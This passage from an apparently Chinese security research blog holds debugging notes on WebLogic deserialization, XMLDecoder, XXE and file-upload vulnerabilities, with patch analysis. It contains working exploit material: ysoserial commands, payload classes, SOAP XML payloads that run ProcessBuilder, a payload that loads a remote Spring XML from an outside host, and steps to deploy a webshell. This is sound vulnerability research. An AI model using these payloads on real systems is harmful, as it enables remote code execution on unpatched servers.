<pre><code>java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections1 "touch /tmp/JRMP" #server端，本地运行</code></pre>
<p>漏洞出现之后，<b style="color:black;background-color:#ffff66">weblogic</b>在<code>modules/com.bea.core.<b style="color:black;background-color:#ffff66">weblogic</b>.rmi.client_1.11.0.0.jar!/<b style="color:black;background-color:#ffff66">weblogic</b>/rjvm/InboundMsgAbbrev.class</code>增加了如下过滤（没钱买补丁只能盗图。。）：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/2384e13d-722f-4459-8b75-db6fddc25307.png" alt=""></p>
<p>补丁图片来自<a href="https://paper.seebug.org/584/"><b style="color:black;background-color:#ffff66">Weblogic</b> 反序列化漏洞(CVE-2018-2628)漫谈</a>。</p>
<p>为什么要这么修呢？看一下ysoserial中的payload JRMPClient是怎么写的：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191126153325.png" alt=""></p>
<p>当动态代理的代理类被反序列化时会在<code>readObject</code>之前先调用<code>resolveProxyClass</code>，我们从图中看到黑名单中只有<code>java.rmi.registry.Registry</code>。可见<b style="color:black;background-color:#ffff66">weblogic</b>官方只是指哪修哪，并没有从根源上解决问题。</p>
<p>来看一下CVE-2017-3248的部分调用链：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191126152848.png" alt=""></p>
<p>第一个readObject是应用反序列化JRMPClient，第二个是利用成功之后，client访问恶意server，读取server中的恶意数据进行反序列化。可以注意到反序列化调用的并不是<code>java.rmi.server.RemoteObjectInvocationHandler</code>的readObject，而是<code>RemoteObject</code>的。这是因为<code>RemoteObjectInvocationHandler</code>本身没有实现readObject，所以使用了父类方法。</p>
<p>那么目前绕过思路有这么几个：</p>
<ol>
<li>既然是反序列化代理类才会调用<code>resolveProxyClass</code>，那么可以找不使用动态代理的gadget。最后调用到<code>java.rmi.server.RemoteObject#readObject</code>或者<code>sum.rmi.server.UnicastRef#readExternal</code>即可。</li>
<li>使用<code>java.rmi.server.RemoteObjectInvocationHandler</code>之外的中介类，只要这个类继承自<code>java.rmi.server.RemoteObject</code>即可。</li>
<li>使用<code>java.rmi.registry.Registry</code>之外的委托类。</li>
</ol>
<h4>CVE-2018-2628</h4>
<p>按照上面的介绍思路，出现了CVE-2018-2628：</p>
<p>绕过一：直接反序列化UnicastRef对象，调用<code>sum.rmi.server.UnicastRef#readExternal</code>。</p>
<pre><code class="language-java">public class JRMPClient2 extends PayloadRunner implements ObjectPayload&lt;Object&gt; {
    public Object getObject ( final String command ) throws Exception {
                //与JRMPClient相同
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
                //使用动态代理的部分直接删除
        return ref;
    }

    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());
        PayloadRunner.run(JRMPClient2.class, args);
    }
}</code></pre>
<p>绕过二：用Activator代替Registry，它们都继承自<code>java.rmi.Remote</code>：</p>
<pre><code class="language-java">public class JRMPClient3 extends PayloadRunner implements ObjectPayload&lt;Activator&gt; {
    public Activator getObject ( final String command ) throws Exception {
                //与JRMPClient相同
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient3.class.getClassLoader(), new Class[] {
            Activator.class
        }, obj);
        return proxy;
    }

    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
        PayloadRunner.run(JRMPClient3.class, args);
    }
}</code></pre>
<h4>CVE-2018-2893</h4>
<p>这次绕过是前面两个漏洞的结合，由于<b style="color:black;background-color:#ffff66">weblogic</b>一直没有处理<code>streamMessageImpl</code>，导致CVE-2016-0638 + CVE-2018-2628 = CVE-2018-2893。</p>
<p><a href="https://github.com/pyn3rd/CVE-2018-2893"></a><a href="https://github.com/pyn3rd/CVE-2018-2893">https://github.com/pyn3rd/CVE-2018-2893</a></p>
<h4>CVE-2018-3245</h4>
<p>同样是jrmp相关的绕过，这次使用<code>ReferenceWrapper_Stub</code>来代替<code>RemoteObjectInvocationHandler</code>：</p>
<pre><code class="language-java">public class JRMPClient4 extends PayloadRunner implements ObjectPayload&lt;Object&gt; {
    public Object getObject ( final String command ) throws Exception {
                //与JRMPClient相同
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        //没有过滤的情况下，测试直接返回obj也可以
        //RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        ReferenceWrapper_Stub wrapperStub = new ReferenceWrapper_Stub(ref);
        return wrapperStub;
    }

    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
        PayloadRunner.run(JRMPClient3.class, args);
    }
}</code></pre>
<h4>CVE-2018-3191</h4>
<p>这个漏洞利用的是jndi，与上面的漏洞不同的，这个漏洞是<b style="color:black;background-color:#ffff66">weblogic</b>自身的gadget，没有使用第三方包（如CommonsCollections）中的gadget，所以危害相对来说更大。</p>
<p>漏洞的入口在<code>com.bea.core.repackaged.springframework.spring_1.2.0.0_2-5-3.jar!/com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191127143620.png" alt=""></p>
<p>跟进<code>initUserTransactionAndTransactionManager</code>：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191127143810.png" alt=""></p>
<p>继续跟进，直到<code>com.bea.core.repackaged.springframework.spring_1.2.0.0_2-5-3.jar!/com/bea/core/repackaged/springframework/jndi/JndiTemplate.class</code>：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191127144011.png" alt=""></p>
<p>所以我们只要构造<code>userTransactionName</code>属性为恶意jndi地址即可。</p>
<p>这里exp构造起来也很简单：</p>
<pre><code class="language-java">package cn.seaii.unser.exp;
import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
import java.io.IOException;

public class JNDI1 extends Exp {
    public static void main(String[] args) throws IOException {
        String jndiAddress = "rmi://10.254.254.254:1099/Exploit";
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName(jndiAddress);

        ser(jtaTransactionManager);
    }
}</code></pre>
<p>这里不知道为什么用marshalsec起一个rmi server不好使，需要起一个JRMPServer。</p>
<h3>XMLDecoder</h3>
<p>在分析XMLDecoder相关的漏洞时，我们将重点放在xml解析的过程，<b style="color:black;background-color:#ffff66">weblogic</b>的路由分发等只做简要介绍。</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191201171309.png" alt=""></p>
<p>这部分调用栈就是<b style="color:black;background-color:#ffff66">weblogic</b>路由分发的过程，从<code>server/lib/<b style="color:black;background-color:#ffff66">weblogic</b>.jar!/<b style="color:black;background-color:#ffff66">weblogic</b>/wsee/jaxws/workcontext/WorkContextTube.class</code>的<code>readHeaderOld</code>方法开始解析xml：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191201174124.png" alt=""></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191201173606.png" alt=""></p>
<p><code>server/lib/<b style="color:black;background-color:#ffff66">weblogic</b>.jar!/<b style="color:black;background-color:#ffff66">weblogic</b>/wsee/workarea/WorkContextXmlInputAdapter.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191201175337.png" alt=""></p>
<p>上述部分是<b style="color:black;background-color:#ffff66">weblogic</b>对于传入的xml的处理，后面才正式交给jdk中的XMLDecoder进行处理。关于这部分在<a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704"><b style="color:black;background-color:#ffff66">WebLogic</b>安全研究报告</a>这篇文章中的<strong>XMLDecoder反序列化漏洞</strong>部分已经有了非常非常详尽的描述，再次表达一下对贡献这篇文章的两位师傅的膜拜。</p>
<p>解析的核心在于XMLDecoder对标签的匹配，通过反射调用相应的方法。</p>
<p><code>1.6.0.jdk/Contents/Classes/classes.jar!/com/sun/beans/ObjectHandler.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191201180506.png" alt=""></p>
<p>在jdk1.7专门为标签设置了对应的handler：</p>
<p><code>jdk1.7.0_21.jdk/Contents/Home/jre/lib/rt.jar!/com/sun/beans/decoder/DocumentHandler.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191201180859.png" alt=""></p>
<p>配合payload看可能更容易理解：</p>
<pre><code class="language-xml">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
  &lt;soapenv:Header&gt;
    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
      &lt;java&gt;
        &lt;object class="java.lang.ProcessBuilder"&gt;
          &lt;array class="java.lang.String" length="3"&gt;
            &lt;void index="0"&gt;
              &lt;string&gt;/bin/bash&lt;/string&gt;
            &lt;/void&gt;
            &lt;void index="1"&gt;
              &lt;string&gt;-c&lt;/string&gt;
            &lt;/void&gt;
            &lt;void index="2"&gt;
              &lt;string&gt;whoami&lt;/string&gt;
            &lt;/void&gt;
          &lt;/array&gt;
          &lt;void method="start"/&gt;
        &lt;/object&gt;
      &lt;/java&gt;
    &lt;/work:WorkContext&gt;
  &lt;/soapenv:Header&gt;
  &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;</code></pre>
<h4>CVE-2017-3506</h4>
<p>最一开始的<b style="color:black;background-color:#ffff66">weblogic</b>就像白纸一样，一点过滤也没有，payload就在上面，但是没有回显。</p>
<p>重点来看修复：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191201182223.png" alt=""></p>
<p>补丁再次白嫖，来自<a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/"><b style="color:black;background-color:#ffff66">Weblogic</b> XMLDecoder RCE分析</a>。</p>
<h4>CVE-2017-<a name="baidusnap2"></a><b style="color:black;background-color:#99ff99">10271</b>/CVE-2017-10352</h4>
<p>只过滤object显然是不行的，这两个漏洞都是对上述补丁的绕过。我们试着分析绕过原理：</p>
<p>绕过方式一：将object改为void，以jdk1.7为例来看</p>
<p><code>jdk1.7.0_21.jdk/Contents/Home/jre/lib/rt.jar!/com/sun/beans/decoder/VoidElementHandler.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191201185457.png" alt=""></p>
<p>VoidElementHandler继承自ObjectElementHandler，且没有任何实现，所以最后还是走ObjectElementHandler的逻辑。</p>
<p>绕过方式二：使用new：</p>
<pre><code class="language-xml">&lt;java class="java.beans.XMLDecoder"&gt;
  &lt;new class="java.lang.ProcessBuilder"&gt;
    &lt;string&gt;whoami&lt;/string&gt;&lt;void method="start"/&gt;
  &lt;/new&gt;
&lt;/java&gt;</code></pre>
<p>这种方式jdk1.6不支持，无法生效。</p>
<p>在这次绕过之后，<b style="color:black;background-color:#ffff66">weblogic</b>加强了过滤：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191201191451.png" alt=""></p>
<p>补丁再再次白嫖，同样来自<a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/"><b style="color:black;background-color:#ffff66">Weblogic</b> XMLDecoder RCE分析</a>。这次将object、void、new等全部过滤，已经无法创建java实例。但是如果xmldecode增加新的解析规则，而黑名单不同步更新的话，不排除再次出现绕过的可能。</p>
<h4>CVE-2019-2725</h4>
<p>随着过滤越来越严格，漏洞利用也越来越困难。</p>
<p>首先看漏洞的入口，首先我们发送一个最简单的soap请求：</p>
<pre><code class="language-xml">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
  &lt;soapenv:Header&gt;
  &lt;/soapenv:Header&gt;
  &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt; </code></pre>
<p>请求会依次经过21handler来处理：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208133422.png" alt=""></p>
<p>但是当请求有<code><b style="color:black;background-color:#ffff66">weblogic</b>.jar!/<b style="color:black;background-color:#ffff66">weblogic</b>/wsee/async/AsyncResponseHandler.class</code>来处理时，程序终止了，所以我们跟进看一下：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208134735.png" alt=""></p>
<p>可以看到xml中有一个属性没有取到导致程序终止，所以我们要在payload中增加这个属性：</p>
<pre><code class="language-xml">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:ads="http://www.w3.org/2005/08/addressing"&gt;
  &lt;soapenv:Header&gt;
    &lt;ads:Action&gt;demo&lt;/ads:Action&gt;
    &lt;ads:RelatesTo&gt;test&lt;/ads:RelatesTo&gt;
&lt;/soapenv:Header&gt;
  &lt;soapenv:Body&gt;&lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;</code></pre>
<p>继续<b style="color:black;background-color:#A0FFFF">调试</b>，发现在<code><b style="color:black;background-color:#ffff66">weblogic</b>.jar!/<b style="color:black;background-color:#ffff66">weblogic</b>/wsee/ws/dispatch/server/OperationLookupHandler.class</code>程序又终止了：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208140546.png" alt=""></p>
<p><code><b style="color:black;background-color:#ffff66">weblogic</b>.jar!/<b style="color:black;background-color:#ffff66">weblogic</b>/wsee/ws/dispatch/server/OperationLookupHandler.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208141130.png" alt=""></p>
<p>所以我们要再次增加属性以让程序继续运行：</p>
<pre><code class="language-xml">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:ads="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;
  &lt;soapenv:Header&gt;
    &lt;ads:Action&gt;demo&lt;/ads:Action&gt;
    &lt;ads:RelatesTo&gt;test&lt;/ads:RelatesTo&gt;
    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;  
    &lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt;
&lt;soapenv:Body&gt;
  &lt;asy:onAsyncDelivery/&gt;
&lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;</code></pre>
<p>之后请求交给<code><b style="color:black;background-color:#ffff66">weblogic</b>.jar!/<b style="color:black;background-color:#ffff66">weblogic</b>/wsee/workarea/WorkAreaServerHandler.class</code>处理，开始读取<code>work:WorkContext</code>标签中的数据（payload），进行反序列化：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208141525.png" alt=""></p>
<p>既然漏洞的入口找到了，下一步就是利用，但是回看上面的补丁，发现可用的标签所剩无几：</p>
<pre><code>class标签
array标签，但是class属性的值只能是byte
string标签</code></pre>
<p>为了满足这些条件并绕过补丁，达到利用漏洞的目的，我们需要找到这样一个类：</p>
<p>构造函数接受参数，且参数类型为byte[]或者string，构造函数中有敏感操作（反序列化、rce、文件操作、访问rmi等等），下面记录已有的可利用类：</p>
<h5>UnitOfWorkChangeSet</h5>
<p>这个类是漏洞曝出时最先出现的利用类：</p>
<p><code>com.oracle.toplink_1.1.0.0_11-1-1-6-0.jar!/oracle/toplink/internal/sessions/UnitOfWorkChangeSet.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208142736.png" alt=""></p>
<p>可以看到这个类完全符合我们上面说的条件，构造函数接受byte[]类型的参数，并将参数再次反序列化。</p>
<p>但是这个类又很大的局限性，首先这只是一个反序列化的入口，需要寻找可以利用的gadget，此时<b style="color:black;background-color:#ffff66">weblogic</b>的commons-collections已经升级，可以考虑使用<strong>jdk7u21</strong>或者前提到的<strong>CVE-2018-3191</strong>也就是<b style="color:black;background-color:#ffff66">weblogic</b>程序本身的一个gadget。</p>
<p>其实是这个类只存在于<b style="color:black;background-color:#ffff66">weblogic</b>10.3.6，所以利用范围被限制的很死。</p>
<p>同时在构造payload时有一个很大的坑点，好多师傅都提到过，这里记录一下：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208143747.png" alt=""></p>
<p>图片内容来自<a href="https://paper.seebug.org/909/"><b style="color:black;background-color:#ffff66">WebLogic</b> RCE(CVE-2019-2725)漏洞之旅</a>。</p>
<h5>com.sun.rowset.JdbcRowSetImpl</h5>
<p>可以通过property属性重写payload，可以无视<b style="color:black;background-color:#ffff66">weblogic</b>版本，但是由于xmldecoder解析方式的不同，不适用于jdk1.6。</p>
<h5>org.slf4j.ext.EventData</h5>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208144720.png" alt=""></p>
<p>同样符合漏洞利用的条件，可以无视jdk版本，但是只能在12.1.3版本中利用。</p>
<h5>FileSystemXmlApplicationContext</h5>
<p>最后是廖师傅的文章<a href="http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/">CVE-2019-2725 分析</a>中提到的<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>，可以无视<b style="color:black;background-color:#ffff66">weblogic</b>和jdk的版本限制。其实这个思路在上面<code>cve-2018-3245</code>中就有利用，虽然<b style="color:black;background-color:#ffff66">weblogic</b>将spring相关的类加入了黑名单，但是<b style="color:black;background-color:#ffff66">weblogic</b>自己打包了一份spring，包名是<code>com.bea.core.repackaged.springframework.xxxx</code>，这样的包名让关于spring的黑名单形同虚设。</p>
<p>这个利用方式用的是<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>，如果了解spring框架运行机制就会知道：spring会读取xml配置文件，然后通过反射来实例化xml中声明的类。如果我们让程序读取事先构造好的恶意配置文件，就可以实例化任意类。</p>
<p>payload如下：</p>
<pre><code class="language-xml">&lt;!-- 篇幅问题省略重复部分 --&gt;
&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;  
  &lt;java&gt;
    &lt;class&gt;
      &lt;string&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/string&gt;
      &lt;void&gt; 
        &lt;string&gt;http://10.254.254.254:8100/spel.xml&lt;/string&gt; 
      &lt;/void&gt;
    &lt;/class&gt; 
  &lt;/java&gt; 
&lt;/work:WorkContext&gt; </code></pre>
<p>下一步就是构造恶意xml配置文件。由于<b style="color:black;background-color:#ffff66">weblogic</b>继承的spring版本较老，不能通过spel表达式调用方法，所以xml内容需要微调：</p>
<pre><code class="language-xml">&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;
  &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;
    &lt;constructor-arg&gt;
      &lt;list&gt;
        &lt;value&gt;touch&lt;/value&gt;
        &lt;value&gt;/tmp/spel&lt;/value&gt;
      &lt;/list&gt;
    &lt;/constructor-arg&gt;
  &lt;/bean&gt;
&lt;/beans&gt;</code></pre>
<p>下面从代码层面看一下：</p>
<p>XML解析过程略过，直接来到：<code>com.bea.core.repackaged.springframework.spring_1.2.0.0_2-5-3.jar!/com/bea/core/repackaged/springframework/context/support/FileSystemXmlApplicationContext.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191206174512.png" alt=""></p>
<p>解析调用的过程不再细说，整个调用栈如下：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191206200804.png" alt=""></p>
<p>这个漏洞的时间线可以看<a href="https://paper.seebug.org/909/"><b style="color:black;background-color:#ffff66">WebLogic</b> RCE(CVE-2019-2725)漏洞之旅</a>，描述的非常清晰。</p>
<h5>防御</h5>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20190620123907.png" alt=""></p>
<p>补丁来自<a href="https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2019-2729 <b style="color:black;background-color:#ffff66">WEBLOGIC</b> XMLDECODER反序列化漏洞分析</a>（已经记不清是第几次白嫖了），可以看到还是基于黑名单。</p>
<h4>CVE-2019-2729</h4>
<p>我们在之前也提到过，xmldecoder的解析在jdk1.6与jdk1.7/1.8之间是有区别的，正是这种区别导致了这次绕过，该漏洞只影响jdk1.6。</p>
<p>与jdk1.7一个标签对应一个handler的处理方式不同的是，jdk1.6将所有标签进行统一处理：</p>
<p><code>1.6.0.jdk/Contents/Classes/classes.jar!/com/sun/beans/ObjectHandler.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208171005.png" alt=""></p>
<p>不管是什么标签，只要有method属性，就会set。</p>
<p>继续向下看，array标签的特殊处理：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208171301.png" alt=""></p>
<p>如果没有设置class属性，默认设置为Object。</p>
<p>在这种处理之下，即使我们传入的是array标签，仍然可以得到一个<code>java.lang.Object</code>对象，自然可以通过<code>forName</code>方法得到任意类的实例化。</p>
<p>最终<code>forName</code>方法会在<code>1.6.0.jdk/Contents/Classes/classes.jar!/java/beans/Statement.class</code>调用：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191208171556.png" alt=""></p>
<p>payload如下：</p>
<pre><code class="language-xml">&lt;java&gt;
    &lt;array method="forName"&gt;                  
    &lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;
    &lt;void&gt;
      ......
    &lt;/void&gt;
  &lt;/array&gt;
&lt;/java&gt; </code></pre>
<h5>防御</h5>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20190620124935.png" alt=""></p>
<p>白嫖是我快乐，补丁来自<a href="https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2019-2729 <b style="color:black;background-color:#ffff66">WEBLOGIC</b> XMLDECODER反序列化漏洞分析</a>。</p>
<p>这次终于使用了白名单的方式，严格限制了能够使用的标签以及属性，期待下一次绕过的出现！</p>
<h3>XXE</h3>
<p>java中出现xxe的原因大同小异，多半是没有setFeature。当然在实际应用的利用过程中还有各种各样的坑，这里附上两篇<strong>Longofo</strong>师傅的文章：</p>
<p><a href="https://paper.seebug.org/906/"><b style="color:black;background-color:#ffff66">WebLogic</b> CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析</a></p>
<p><a href="https://paper.seebug.org/1067/"><b style="color:black;background-color:#ffff66">WebLogic</b> EJBTaglibDescriptor XXE漏洞(CVE-2019-2888)分析</a></p>
<h3>文件上传(CVE-2018-2894)</h3>
<p>这是<b style="color:black;background-color:#ffff66">Weblogic</b> Web Service Test Page处的任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，同时<b style="color:black;background-color:#ffff66">weblogic</b>部署的目录中有随机值，所以该漏洞有一定限制。同样附上文章：</p>
<p><a href="https://chybeta.github.io/2018/07/21/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-2894-%E3%80%91/"><b style="color:black;background-color:#ffff66">WebLogic</b>任意文件上传漏洞复现与分析 -【CVE-2018-2894 】</a></p>
<h3>小彩蛋</h3>
<p>习惯了<b style="color:black;background-color:#ffff66">weblogic</b>这么多漏洞，如果有一天直接进了后台反而不会操作了，最尴尬的事情莫过于此，这个小彩蛋记录一下如何直接在<b style="color:black;background-color:#ffff66">weblogic</b>后台部署一个webshell。</p>
<p>首先生成war包：</p>
<pre><code class="language-shell">jar -cvf l1.war l1.jsp</code></pre>
<p>在后台找到<strong>部署</strong>，然后上传我们构造好的war包，然后继续，后面一路默认+下一步就行了。</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191127183834.png" alt=""></p>
<h2>0x03 参考链接</h2>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704"><b style="color:black;background-color:#ffff66">WebLogic</b>安全研究报告</a></p>
<p><a href="http://d1iv3.me/2018/06/05/CVE-2015-4852-Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90/">CVE-2015-4852 <b style="color:black;background-color:#ffff66">Weblogic</b> 反序列化RCE分析</a></p>
<p><a href="https://paper.seebug.org/584/"><b style="color:black;background-color:#ffff66">Weblogic</b> 反序列化漏洞(CVE-2018-2628)漫谈</a></p>
<p><a href="https://github.com/5up3rc/weblogic_cmd/"></a><a href="https://github.com/5up3rc/weblogic_cmd/">https://github.com/5up3rc/<b style="color:black;background-color:#ffff66">weblogic</b>_cmd/</a></p>
<p><a href="https://paper.seebug.org/718/"><b style="color:black;background-color:#ffff66">Weblogic</b> CVE-2018-3191 分析</a></p>
<p><a href="https://www.anquanke.com/post/id/162390">Oracle <b style="color:black;background-color:#ffff66">WebLogic</b> RCE反序列化漏洞分析</a></p>
<p><a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/"><b style="color:black;background-color:#ffff66">Weblogic</b> XMLDecoder RCE分析</a></p>
<p><a href="https://paper.seebug.org/909/"><b style="color:black;background-color:#ffff66">WebLogic</b> RCE(CVE-2019-2725)漏洞之旅</a></p>
<p><a href="https://www.freebuf.com/vuls/206374.html">从CVE-2019-2725绕过谈<b style="color:black;background-color:#ffff66">Weblogic</b> XML RCE的绕过史</a></p>
<p><a href="https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2019-2729 <b style="color:black;background-color:#ffff66">WEBLOGIC</b> XMLDECODER反序列化漏洞分析</a></p>        </div>
		<div class="tags">
			<div class="dkeywords">
			   <div itemprop="keywords" class="keywords">标签: <a href="https://seaii-blog.com/index.php/tag/java/">java</a>, <a href="https://seaii-blog.com/index.php/tag/weblogic/"><b style="color:black;background-color:#ffff66">weblogic</b></a>, <a href="https://seaii-blog.com/index.php/tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>, <a href="https://seaii-blog.com/index.php/tag/xmldecoder/">xmldecoder</a></div>
			</div>
		<div>
    </div></div></article>
</div><!-- end #post-->

</div><!-- end .row -->
</div>

<div id="body-bottom">
<div class="container" id="post-f">
            <div class="post-near">
            <nav>
                <span class="prev"><span class="prev-t">上一篇: </span>没有了</span>
                <span class="next"><span class="prev-t">下一篇: </span><a href="https://seaii-blog.com/index.php/2019/11/11/91.html" title="jenkins rce(CVE-2018-1000861)调试笔记">jenkins rce(CVE-2018-1000861)<b style="color:black;background-color:#A0FFFF">调试</b>笔记</a></span>
            </nav>
        </div>
                        <div id="comments">
                                                    <div id="respond-post-92" class="respond">
                    <div class="cancel-comment-reply">
                        <a id="cancel-comment-reply-link" href="https://seaii-blog.com/index.php/2019/12/08/92.html#respond-post-92" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>                    </div>
                    <span id="response" class="widget-title text-left">添加新评论</span>
                    <form method="post" action="https://seaii-blog.com/index.php/2019/12/08/92.html/comment" id="comment-form">
                                                    <input type="text" name="author" id="author" placeholder="称呼" value="">
                            <input type="email" name="mail" id="mail" placeholder="电子邮件" value="">
                            <input type="text" name="url" id="url" placeholder="网站" value="">
                                                <p>
                            <textarea rows="5" name="text" id="textarea" placeholder="在这里输入你的评论..." style="resize:none;"></textarea>
                                                    </p>
                        <p><input type="submit" value="提交评论" class="button" id="submit"></p>
                    </form>
                </div>
                    </div>
    


</div>
</div>
</div><!-- end #body -->
</div><!-- end #wrap -->
<footer id="footer" role="contentinfo">
    <div class="container">
        <p>Copyright &#169; 2019 <a href="https://seaii-blog.com/">Seaii's Blog</a> &#65533;6&#65533;1 All Rights Reserved.</p>
        <p>Powered By <a href="http://www.typecho.org/">Typecho</a> &#65533;6&#65533;1 Theme <a href="http://hran.me/mirages.html">Mirages</a></p>
    </div>
</footer><!-- end #footer -->
            
            













</div>



</body></html>